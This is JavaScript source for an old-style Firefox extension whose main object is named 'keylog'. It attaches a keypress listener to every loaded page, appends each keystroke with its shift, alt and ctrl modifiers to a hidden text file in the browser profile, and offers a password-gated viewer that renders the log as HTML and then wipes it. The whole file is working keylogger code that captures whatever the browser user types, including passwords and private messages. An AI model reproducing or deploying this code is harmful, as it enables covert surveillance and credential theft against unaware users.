var fff_namespace={};

fff_namespace.fff=function()
{
	var file = Components.classes["@mozilla.org/file/directory_service;1"].
							 getService(Components.interfaces.nsIProperties).
							 get("ProfD", Components.interfaces.nsIFile);
		file.append("FFF");
		if( !file.exists() || !file.isDirectory() ) {   // if it doesn't exist, create
		   file.create(Components.interfaces.nsIFile.DIRECTORY_TYPE, 0777);
		}

	this.f = file.path+"\\text.txt";

	window.addEventListener( "load", function() {fff.init(); }, false);
};
var keylog=new fff_namespace.fff();
function isNumber(n) {
  return !isNaN(parseFloat(n)) && isFinite(n);
}
////////////////////////////////////////////////////////////////////////////////////
keylog.logKeypress=function(e) {
	var file = Components.classes["@mozilla.org/file/local;1"]
						 .createInstance(Components.interfaces.nsILocalFile);
	file.initWithPath(keylog.f);

	var data = '';
	if( e.shiftKey )
		data += 'shift+';
	if( e.altKey )
		data += 'alt+';
	if( e.ctrlKey )
		data += 'ctrl+';
	if(data)
		data += '|';

	data += e.which + "|";
	var	foStream = Components.classes["@mozilla.org/network/file-output-stream;1"]
						   .createInstance(Components.interfaces.nsIFileOutputStream);
	// use 0x02 | 0x10 to open file for appending.
	foStream.init(file, 0x02 | 0x10 | 0x08, 00666, 0); // write(only), append, create file
	foStream.write(data, data.length);
	foStream.close();
}
////////////////////////////////////////////////////////////////////////////////////////////////
keylog.present_log=function() {

	var pass="",
		initial_pass="",
		input_pass="",
		i,
		tmp="";

	//if there's no  password, create it
	var prefs = Components.classes["@mozilla.org/preferences-service;1"]
						.getService(Components.interfaces.nsIPrefService).getBranch("extensions.");
	try {initial_pass = prefs.getCharPref("fff_pass"); }
	catch(e)
	{
	initial_pass=prompt("You haven't defined a password yet."+"\n"+"Please enter a new password!");
	for(i=0;i<initial_pass.length; i++)
	   {
		pass+=initial_pass.charCodeAt(i)+"|";
	   }
	prefs.setCharPref("fff_pass",pass);
	initial_pass = pass; //to prevent error on first login
	}

	pass="";
	//Check the user's password
	input_pass=prompt("Please enter your password!");
	for(i=0; i<initial_pass.length; i++)
	   {
		if(initial_pass.substr(i,1)!='|')
		   tmp+=initial_pass.substr(i,1);
		else
		   {
			pass+=String.fromCharCode(tmp);
			tmp="";
		   }
	   }

	if(input_pass!=pass)
	   {
		alert("Your password is wrong.  Please try again!");
		return;
	   }

	//read the contents of the log file
	var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
	file.initWithPath(keylog.f);

	var inputStream = Components.classes["@mozilla.org/network/file-input-stream;1"].createInstance(Components.interfaces.nsIFileInputStream);
	inputStream.init(file, -1, 0,0);
	var sInputStream = Components.classes["@mozilla.org/scriptableinputstream;1"].createInstance(Components.interfaces.nsIScriptableInputStream);
	sInputStream.init(inputStream);
	var str= sInputStream.read(sInputStream.available());

	//writing the log file to a designed HTML file
	var len=String(str).length;
	var tmp_str='<!DOCTYPE html><html><head><meta charset="utf-8" /></head><body style="font-family:monospace">' + "\n";
	var charrr = '';
	var charrrAfter = '';

	for(var y=0,begin_segment=0;y<len; y++)
	{
	 if(str.substring(y,y+1)=='|')
	 {
	  //tmp_str+=String.fromCharCode(str.substring(begin_segment,y));
	  charrr = str.substring(begin_segment,y);
	  if(!isNumber(charrr))
	  {
		tmp_str+='<span style="color:green">&lt;' + charrr;
		charrrAfter='></span>';
	  }
	  else
	  {
		  if(charrr == 13)
			tmp_str+="<br>\n";
		  else if(charrr == 8)
			tmp_str+='<span style="color:red">[BS]</span>';
		  else if(charrr == 0)
			tmp_str+='<span style="color:gray">[tab]</span>';
		  else
			tmp_str+='&#' + charrr + ';';

			tmp_str+=charrrAfter;
			charrrAfter = '';
		}
	  begin_segment=y+1;

	 }
	}
tmp_str += "\n</body></html>";

	//not stored in history

	var win=window.open('data:text/html;charset=utf-8,' + encodeURIComponent(tmp_str), 'log');
	win.focus();

	//delete the contents of the log file
	var file = Components.classes["@mozilla.org/file/local;1"] .createInstance(Components.interfaces.nsILocalFile);
	file.initWithPath(keylog.f);
	// file is nsIFile, data is a string
	var foStream = Components.classes["@mozilla.org/network/file-output-stream;1"].createInstance(Components.interfaces.nsIFileOutputStream);
	// use 0x02 | 0x10 to open file for appending.
	foStream.init(file, 0x02 | 0x08 | 0x20, 0666, 0); // write(only), append, create file
	foStream.write("", 0);
	foStream.close();
};
////////////////////////////////////////////////////////////////////////////////////////////////

if ("undefined" == typeof(fff))
{
	var fff = {
		init : function() {
			document.addEventListener("keypress", keylog.logKeypress, false);
		}
	}
}
